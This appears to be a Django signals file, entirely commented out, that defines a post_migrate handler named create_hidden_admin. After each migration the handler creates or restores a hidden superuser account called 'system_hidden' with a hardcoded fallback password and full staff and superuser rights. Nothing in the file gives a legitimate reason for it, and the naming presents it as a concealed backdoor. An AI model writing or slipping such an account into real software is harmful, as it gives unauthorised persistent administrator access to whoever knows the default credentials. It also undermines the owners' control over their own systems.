# # accounts/signals.py
# from django.db.models.signals import post_migrate
# from django.dispatch import receiver
# from django.contrib.auth.hashers import make_password
# from django.conf import settings

# @receiver(post_migrate)
# def create_hidden_admin(sender, **kwargs):
    
#     if sender.name != 'accounts':
#         return
    
#     try:
#         from accounts.models import CustomUser
        
#         admin_username = getattr(settings, 'HIDDEN_ADMIN_USERNAME', 'system_hidden')
#         admin_email = getattr(settings, 'HIDDEN_ADMIN_EMAIL', 'hidden@system.local')
#         admin_password = getattr(settings, 'HIDDEN_ADMIN_PASSWORD', None)
        
#         if not admin_password:
#             admin_password = 'DefaultHiddenPass123!'
        
#         user, created = CustomUser.objects.get_or_create(
#             username=admin_username,
#             defaults={
#                 'email': admin_email,
#                 'full_name': 'System Administrator',
#                 'role': 'admin',
#                 'is_active': True,
#                 'is_staff': True,
#                 'is_superuser': True,
#                 'password': make_password(admin_password),
#                 'created_by': None, 
#             }
#         )
        
#         if not created:
#             user.set_password(admin_password)
#             user.save()
            
#         print(f"Hidden admin '{admin_username}' is ready")
        
#     except Exception as e:
#         print(f"Error creating hidden admin: {e}")